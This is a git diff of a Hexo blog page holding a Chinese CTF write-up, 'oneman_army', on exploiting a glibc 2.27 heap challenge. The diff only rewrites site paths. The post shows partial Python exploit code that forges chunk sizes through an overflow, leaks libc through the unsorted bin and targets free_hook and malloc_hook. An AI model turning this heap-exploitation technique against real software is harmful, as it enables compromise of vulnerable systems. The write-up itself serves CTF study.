@@ -5,33 +5,33 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下，9011功能可以溢出   最大申请0x1FF大小的堆，申请次数没有限制">
 <meta property="og:type" content="article">
 <meta property="og:title" content="oneman_army(tcache里几个小chunk伪造成大chunk申请出来)">
-<meta property="og:url" content="https://github.com/ha1vk/2020/02/07/oneman_army/index.html">
+<meta property="og:url" content="https://github.com/2020/02/07/oneman_army/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下，9011功能可以溢出   最大申请0x1FF大小的堆，申请次数没有限制">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/07/oneman_army/image1.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/07/oneman_army/image2.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/07/oneman_army/image3.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/07/oneman_army/image4.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/07/oneman_army/image5.JPG">
+<meta property="og:image" content="https://github.com/2020/02/07/oneman_army/image1.JPG">
+<meta property="og:image" content="https://github.com/2020/02/07/oneman_army/image2.JPG">
+<meta property="og:image" content="https://github.com/2020/02/07/oneman_army/image3.JPG">
+<meta property="og:image" content="https://github.com/2020/02/07/oneman_army/image4.JPG">
+<meta property="og:image" content="https://github.com/2020/02/07/oneman_army/image5.JPG">
 <meta property="article:published_time" content="2020-02-07T13:28:50.000Z">
 <meta property="article:modified_time" content="2025-06-21T11:51:59.394Z">
 <meta property="article:author" content="ha1vk">
@@ -40,9 +40,9 @@
 <meta property="article:tag" content="glibc 2.27">
 <meta property="article:tag" content="large bin">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/02/07/oneman_army/image1.JPG">
+<meta name="twitter:image" content="https://github.com/2020/02/07/oneman_army/image1.JPG">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/02/07/oneman_army/">
+<link rel="canonical" href="https://github.com/2020/02/07/oneman_army/">
 
 
 <script id="page-configurations">
@@ -104,7 +104,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -125,27 +125,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -203,10 +203,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/02/07/oneman_army/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/02/07/oneman_army/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -241,7 +241,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -264,16 +264,16 @@
 
       
         <p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/02/07/oneman_army/image1.JPG" class="">
+<img src="/2020/02/07/oneman_army/image1.JPG" class="">
 
 <p>然后，我们用IDA分析一下，9011功能可以溢出</p>
-<img src="/ha1vk/2020/02/07/oneman_army/image2.JPG" class="">
+<img src="/2020/02/07/oneman_army/image2.JPG" class="">
 
 <p>最大申请0x1FF大小的堆，申请次数没有限制</p>
-<img src="/ha1vk/2020/02/07/oneman_army/image3.JPG" class="">
+<img src="/2020/02/07/oneman_army/image3.JPG" class="">
 
 <p>Delete功能没有把指针清空</p>
-<img src="/ha1vk/2020/02/07/oneman_army/image4.JPG" class="">
+<img src="/2020/02/07/oneman_army/image4.JPG" class="">
 
 <p>本题，已知libc为2.27，所以存在tcache bin机制，可以很容易利用。我们肯定是要攻击free_hook或者malloc_hook,那么首先需要泄露地址，而泄露地址，需要利用unsorted bin，溢出，我们就**[利用溢出，修改下一个chunk的size，使得大小为large bin范围，然后把它申请回来后再delete，就可以放入unsorted bin]{.mark}**</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x10</span>):  </span><br><span class="line">   create(<span class="number">0x10</span>*i, <span class="string">&#x27;AAA&#x27;</span>)  </span><br><span class="line">   delete()  </span><br><span class="line"><span class="comment">#把chunk0申请回来  </span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;A&#x27;</span>)  </span><br><span class="line"><span class="comment">#溢出，修改下一个chunk的size，使得其大小为large bin范围  </span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>  </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x4b1</span>)  </span><br><span class="line">edit256byte(payload)  </span><br><span class="line">delete()  </span><br><span class="line"><span class="comment">#将chunk1申请回来  </span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;B&#x27;</span>)  </span><br><span class="line"><span class="comment">#现在chunk1的size为0x4d1,我们delete它，就可以放入unsorted bin  </span></span><br><span class="line">delete()  </span><br></pre></td></tr></table></figure>
@@ -282,7 +282,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将libc指针传递到chunk2  </span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;B&#x27;</span>) <span class="comment">#chunk1  </span></span><br></pre></td></tr></table></figure>
 
 <p>我们来看看，unsorted bin的头和tcache bin的头重合了</p>
-<img src="/ha1vk/2020/02/07/oneman_army/image5.JPG" class="">
+<img src="/2020/02/07/oneman_army/image5.JPG" class="">
 
 <p>现在，我们只需把0x40的chunk申请回来，里面就有指针信息，我们只需泄露即可</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x30</span>,<span class="string">&#x27;C&#x27;</span>) <span class="comment">#chunk2  </span></span><br><span class="line">show()  </span><br><span class="line">sh.recv(<span class="number">1</span>)  </span><br><span class="line">main_arena_xx = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">malloc_hook_addr = (main_arena_xx &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_hook_s &amp; <span class="number">0xFFF</span>)  </span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s  </span><br><span class="line">free_hook_addr = libc_base + free_hook_s  </span><br><span class="line">system_addr = libc_base + system_s  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br></pre></td></tr></table></figure>
@@ -301,10 +301,10 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/tcache/" rel="tag"># tcache</a>
-              <a href="/ha1vk/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
-              <a href="/ha1vk/tags/glibc-2-27/" rel="tag"># glibc 2.27</a>
-              <a href="/ha1vk/tags/large-bin/" rel="tag"># large bin</a>
+              <a href="/tags/tcache/" rel="tag"># tcache</a>
+              <a href="/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
+              <a href="/tags/glibc-2-27/" rel="tag"># glibc 2.27</a>
+              <a href="/tags/large-bin/" rel="tag"># large bin</a>
           </div>
 
         
@@ -313,11 +313,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/02/07/secret_holder/" rel="prev" title="secret_holder">
+    <a href="/2020/02/07/secret_holder/" rel="prev" title="secret_holder">
       <i class="fa fa-chevron-left"></i> secret_holder
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/02/09/boi/" rel="next" title="boi">
+    <a href="/2020/02/09/boi/" rel="next" title="boi">
       boi <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -389,20 +389,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -475,30 +475,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
